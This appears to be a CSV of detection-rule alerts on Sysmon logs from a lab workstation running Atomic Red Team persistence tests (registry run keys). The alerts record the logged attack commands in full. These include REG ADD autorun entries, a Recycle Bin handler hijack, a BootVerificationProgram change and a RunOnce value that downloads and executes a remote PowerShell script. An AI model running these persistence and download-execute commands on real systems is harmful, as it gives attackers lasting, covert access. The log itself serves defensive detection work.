"2025-12-26 11:18:45.379 +01:00","Potential Persistence Attempt Via Run Keys Using Reg.EXE","med","DESKTOP-G2OBL3D","Sysmon",1,"PrivEsc ¦ Persis","T1547.001","sysmon",173559,"Cmdline: REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""C:\Path\AtomicRedTeam.exe"" ¦ Proc: C:\Windows\System32\reg.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""C:\Path\AtomicRedTeam.exe"" ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 2516 ¦ PGUID: E9F06A57-6105-694E-6B01-000000002400 ¦ ParentPID: 6604 ¦ ParentPGUID: E9F06A57-6105-694E-6901-000000002400 ¦ Description: Registry Console Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: reg.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:45.371","proc_creation_win_reg_add_run_key.yml","7f2f1ee8-50e3-cffb-315b-824441de4f87","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:49.420 +01:00","Potential Persistence Attempt Via Run Keys Using Reg.EXE","med","DESKTOP-G2OBL3D","Sysmon",1,"PrivEsc ¦ Persis","T1547.001","sysmon",173562,"Cmdline: REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\Path\AtomicRedTeam.dll"" ¦ Proc: C:\Windows\System32\reg.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\Path\AtomicRedTeam.dll"" ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1804 ¦ PGUID: E9F06A57-6109-694E-6E01-000000002400 ¦ ParentPID: 840 ¦ ParentPGUID: E9F06A57-6109-694E-6C01-000000002400 ¦ Description: Registry Console Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: reg.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:49.413","proc_creation_win_reg_add_run_key.yml","7f2f1ee8-50e3-cffb-315b-824441de4f87","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:45.379 +01:00","Direct Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",1,"PrivEsc ¦ Persis","T1547.001","sysmon",173559,"Cmdline: REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""C:\Path\AtomicRedTeam.exe"" ¦ Proc: C:\Windows\System32\reg.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""C:\Path\AtomicRedTeam.exe"" ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 2516 ¦ PGUID: E9F06A57-6105-694E-6B01-000000002400 ¦ ParentPID: 6604 ¦ ParentPGUID: E9F06A57-6105-694E-6901-000000002400 ¦ Description: Registry Console Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: reg.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:45.371","proc_creation_win_reg_direct_asep_registry_keys_modification.yml","7564e582-322d-e013-3391-edf2f6dfbb20","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:49.420 +01:00","Direct Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",1,"PrivEsc ¦ Persis","T1547.001","sysmon",173562,"Cmdline: REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\Path\AtomicRedTeam.dll"" ¦ Proc: C:\Windows\System32\reg.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\Path\AtomicRedTeam.dll"" ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1804 ¦ PGUID: E9F06A57-6109-694E-6E01-000000002400 ¦ ParentPID: 840 ¦ ParentPGUID: E9F06A57-6109-694E-6C01-000000002400 ¦ Description: Registry Console Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: reg.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:49.413","proc_creation_win_reg_direct_asep_registry_keys_modification.yml","7564e582-322d-e013-3391-edf2f6dfbb20","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:18.846 +01:00","Dumping of Sensitive Hives Via Reg.EXE","high","DESKTOP-G2OBL3D","Sysmon",1,"CredAccess","T1003.002 ¦ T1003.004 ¦ T1003.005","car.2013-07-001 ¦ sysmon",173643,"Cmdline: ""C:\WINDOWS\system32\reg.exe"" export ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager"" C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg /y ¦ Proc: C:\Windows\System32\reg.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {if (!(Test-Path \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""")) { reg.exe export \""""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\"""" \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""" /y } Set-ItemProperty -Path \""""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\"""" -Name \""""BootExecute\"""" -Value \""""autocheck autoche *\"""" -Type MultiString} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7208 ¦ PGUID: E9F06A57-6126-694E-A001-000000002400 ¦ ParentPID: 1456 ¦ ParentPGUID: E9F06A57-6126-694E-9E01-000000002400 ¦ Description: Registry Console Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: reg.exe ¦ ParentCommandLine: ""powershell.exe"" & {if (!(Test-Path \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""")) { reg.exe export \""""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\"""" \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""" /y } Set-ItemProperty -Path \""""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\"""" -Name \""""BootExecute\"""" -Value \""""autocheck autoche *\"""" -Type MultiString} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:18.839","proc_creation_win_reg_dumping_sensitive_hives.yml","70968431-a84d-2f9d-00d5-5164c7a25d9c","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:19.445 +01:00","Potential Persistence Attempt Via Existing Service Tampering","med","DESKTOP-G2OBL3D","Sysmon",1,"PrivEsc ¦ Evas ¦ Persis","T1543.003 ¦ T1574.011","sysmon",173647,"Cmdline: ""cmd.exe"" /c reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d ""C:\Program Files\Internet Explorer\iexplore.exe"" ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6660 ¦ PGUID: E9F06A57-6127-694E-A401-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:19.435","proc_creation_win_sc_service_tamper_for_persistence.yml","bdaddd46-5790-85bc-afc9-e60186bbc43c","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:19.490 +01:00","Potential Persistence Attempt Via Existing Service Tampering","med","DESKTOP-G2OBL3D","Sysmon",1,"PrivEsc ¦ Evas ¦ Persis","T1543.003 ¦ T1574.011","sysmon",173648,"Cmdline: reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d ""C:\Program Files\Internet Explorer\iexplore.exe"" ¦ Proc: C:\Windows\System32\reg.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d ""C:\Program Files\Internet Explorer\iexplore.exe"" ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7472 ¦ PGUID: E9F06A57-6127-694E-A601-000000002400 ¦ ParentPID: 6660 ¦ ParentPGUID: E9F06A57-6127-694E-A401-000000002400 ¦ Description: Registry Console Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=47FC2471604EB7D760938BF31456B12D,SHA256=321590E79C53AA24B197F08A21A0329E5AB9F212B2BD748AF09A7BE6F838F585,IMPHASH=3B322244D4C64F3C932F94E6E3457771","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: reg.exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:19.480","proc_creation_win_sc_service_tamper_for_persistence.yml","bdaddd46-5790-85bc-afc9-e60186bbc43c","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:18.093 +01:00","Potential Suspicious Activity Using SeCEdit","med","DESKTOP-G2OBL3D","Sysmon",1,"Collect ¦ Disc ¦ Persis ¦ Evas ¦ CredAccess ¦ PrivEsc","T1562.002 ¦ T1547.001 ¦ T1505.005 ¦ T1556.002 ¦ T1562 ¦ T1574.007 ¦ T1564.002 ¦ T1546.008 ¦ T1546.007 ¦ T1547.014 ¦ T1547.010 ¦ T1547.002 ¦ T1557 ¦ T1082","sysmon",173639,"Cmdline: secedit /configure /db mytemplate.db ¦ Proc: C:\Windows\System32\SecEdit.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""cmd.exe"" /c secedit /import /db mytemplate.db /cfg ""C:\AtomicRedTeam\atomics\T1547.001\src\regtemplate.ini"" & secedit /configure /db mytemplate.db ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7084 ¦ PGUID: E9F06A57-6126-694E-9D01-000000002400 ¦ ParentPID: 6952 ¦ ParentPGUID: E9F06A57-6125-694E-9A01-000000002400 ¦ Description: Windows Security Configuration Editor Command Tool ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=3886FFE2612BD422186F537EC7B90B5E,SHA256=594CFC0512B69061C3BD8D82CD0439D737AC834622AA2F199DFA01E4620DCE7D,IMPHASH=58A66C69176097C9B8C5C9AE4273BD6F","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: SeCEdit ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:18.089","proc_creation_win_secedit_execution.yml","bd30d0fa-6396-28c2-f5e5-609dfa50aed4","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:08.229 +01:00","LOL-Binary Copied From System Directory","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1036.003","sysmon",173616,"Cmdline: ""powershell.exe"" & {New-Item -ItemType Directory -path \""""$env:TMP\atomictest\\"""" Copy-Item -path \""""C:\Windows\System32\calc.exe\"""" -destination \""""$env:TMP\atomictest\\"""" Set-ItemProperty -Path \""""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"""" -Name \""""Common Startup\"""" -Value \""""$env:TMP\atomictest\\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8884 ¦ PGUID: E9F06A57-611C-694E-8E01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {New-Item -ItemType Directory -path \""""$env:TMP\atomictest\\"""" Copy-Item -path \""""C:\Windows\System32\calc.exe\"""" -destination \""""$env:TMP\atomictest\\"""" Set-ItemProperty -Path \""""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"""" -Name \""""Common Startup\"""" -Value \""""$env:TMP\atomictest\\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:08.218","proc_creation_win_susp_copy_system_dir_lolbin.yml","8fb84f5c-c692-9a7e-f78e-236822f3687a","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:11.021 +01:00","LOL-Binary Copied From System Directory","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1036.003","sysmon",173619,"Cmdline: ""powershell.exe"" & {New-Item -ItemType Directory -path \""""$env:TMP\atomictest\\"""" Copy-Item -path \""""C:\Windows\System32\calc.exe\"""" -destination \""""$env:TMP\atomictest\\"""" Set-ItemProperty -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"""" -Name \""""Startup\"""" -Value \""""$env:TMP\atomictest\\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 9204 ¦ PGUID: E9F06A57-611F-694E-9001-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {New-Item -ItemType Directory -path \""""$env:TMP\atomictest\\"""" Copy-Item -path \""""C:\Windows\System32\calc.exe\"""" -destination \""""$env:TMP\atomictest\\"""" Set-ItemProperty -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"""" -Name \""""Startup\"""" -Value \""""$env:TMP\atomictest\\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:11.003","proc_creation_win_susp_copy_system_dir_lolbin.yml","8fb84f5c-c692-9a7e-f78e-236822f3687a","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:44.376 +01:00","Local Accounts Discovery","low","DESKTOP-G2OBL3D","Sysmon",1,"Disc","T1033 ¦ T1087.001","sysmon",173557,"Cmdline: ""C:\WINDOWS\system32\whoami.exe"" ¦ Proc: C:\Windows\System32\whoami.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7732 ¦ PGUID: E9F06A57-6104-694E-6801-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: whoami - displays logged on user information ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=956692DADC5B2CEB46E9219F7A5BEFFA,SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3,IMPHASH=E4464BCD92DF7AC69CCD074CB9C0EFED","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: whoami.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:44.354","proc_creation_win_susp_local_system_owner_account_discovery.yml","e149ce89-80e1-9461-ab1f-2c14cabd84c0","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:06.999 +01:00","Registry Persistence Mechanisms in Recycle Bin","high","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547","sysmon",173610,"EventType: SetValue ¦ RegKey: HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command\(Default) ¦ Details: calc.exe ¦ Proc: C:\WINDOWS\system32\reg.exe ¦ PID: 3644 ¦ PGUID: E9F06A57-611A-694E-8801-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1042 ¦ UtcTime: 2025-12-26 10:19:06.997","registry_event_persistence_recycle_bin.yml","5ada0e7f-420d-2b76-c4d6-141ad8a8d1ad","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:19.494 +01:00","CurrentControlSet Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173649,"EventType: SetValue ¦ RegKey: HKLM\System\CurrentControlSet\Control\BootVerificationProgram\ImagePath ¦ Details: C:\Program Files\Internet Explorer\iexplore.exe ¦ Proc: C:\WINDOWS\system32\reg.exe ¦ PID: 7472 ¦ PGUID: E9F06A57-6127-694E-A601-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1031,T1050 ¦ UtcTime: 2025-12-26 10:19:19.493","registry_set_asep_reg_keys_modification_currentcontrolset.yml","e16fe2fe-0c74-ed11-b47f-fb42565e9292","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:45.400 +01:00","CurrentVersion Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173560,"EventType: SetValue ¦ RegKey: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\Run\Atomic Red Team ¦ Details: C:\Path\AtomicRedTeam.exe ¦ Proc: C:\WINDOWS\system32\reg.exe ¦ PID: 2516 ¦ PGUID: E9F06A57-6105-694E-6B01-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1060,RunKey ¦ UtcTime: 2025-12-26 10:18:45.398","registry_set_asep_reg_keys_modification_currentversion.yml","3f59aeed-e4fb-6b21-a7fa-a327fdb8494d","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:49.429 +01:00","CurrentVersion Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173563,"EventType: SetValue ¦ RegKey: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend\1 ¦ Details: C:\Path\AtomicRedTeam.dll ¦ Proc: C:\WINDOWS\system32\reg.exe ¦ PID: 1804 ¦ PGUID: E9F06A57-6109-694E-6E01-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1060,RunKey ¦ UtcTime: 2025-12-26 10:18:49.427","registry_set_asep_reg_keys_modification_currentversion.yml","3f59aeed-e4fb-6b21-a7fa-a327fdb8494d","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:53.681 +01:00","CurrentVersion Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173567,"EventType: SetValue ¦ RegKey: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\NextRun ¦ Details: powershell.exe ""IEX (New-Object Net.WebClient).DownloadString(`""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`"")"" ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6384 ¦ PGUID: E9F06A57-6109-694E-6F01-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1060,RunKey ¦ UtcTime: 2025-12-26 10:18:53.680","registry_set_asep_reg_keys_modification_currentversion.yml","3f59aeed-e4fb-6b21-a7fa-a327fdb8494d","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:07.893 +01:00","CurrentVersion Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173615,"EventType: SetValue ¦ RegKey: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\Run\socks5_powershell ¦ Details: powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8680 ¦ PGUID: E9F06A57-611B-694E-8C01-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1060,RunKey ¦ UtcTime: 2025-12-26 10:19:07.886","registry_set_asep_reg_keys_modification_currentversion.yml","3f59aeed-e4fb-6b21-a7fa-a327fdb8494d","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:13.404 +01:00","CurrentVersion Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173625,"EventType: SetValue ¦ RegKey: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\atomictest ¦ Details: C:\Windows\System32\calc.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8004 ¦ PGUID: E9F06A57-6120-694E-9201-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1060,RunPolicy ¦ UtcTime: 2025-12-26 10:19:13.404","registry_set_asep_reg_keys_modification_currentversion.yml","3f59aeed-e4fb-6b21-a7fa-a327fdb8494d","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:16.176 +01:00","CurrentVersion Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173628,"EventType: SetValue ¦ RegKey: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\atomictest ¦ Details: C:\Windows\System32\calc.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2424 ¦ PGUID: E9F06A57-6121-694E-9401-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1060,RunPolicy ¦ UtcTime: 2025-12-26 10:19:16.175","registry_set_asep_reg_keys_modification_currentversion.yml","3f59aeed-e4fb-6b21-a7fa-a327fdb8494d","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:18.134 +01:00","CurrentVersion Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173640,"EventType: SetValue ¦ RegKey: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\calc ¦ Details: calc.exe ¦ Proc: C:\WINDOWS\system32\services.exe ¦ PID: 776 ¦ PGUID: E9F06A57-5FDF-694E-0B00-000000002400 ¦ User: NT AUTHORITY\SYSTEM","RuleName: T1060,RunKey ¦ UtcTime: 2025-12-26 10:19:18.133","registry_set_asep_reg_keys_modification_currentversion.yml","3f59aeed-e4fb-6b21-a7fa-a327fdb8494d","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:16.853 +01:00","CurrentVersion NT Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173631,"EventType: SetValue ¦ RegKey: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit-backup ¦ Details: C:\WINDOWS\system32\userinit.exe, ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6056 ¦ PGUID: E9F06A57-6124-694E-9601-000000002400 ¦ User: DESKTOP-G2OBL3D\student","Details: C:\WINDOWS\system32\userinit.exe, ¦ RuleName: - ¦ UtcTime: 2025-12-26 10:19:16.851","registry_set_asep_reg_keys_modification_currentversion_nt.yml","5800ac7d-6494-f095-585d-e83af10a41f5","C:\Tools\Logs\art_1547_001.evtx"
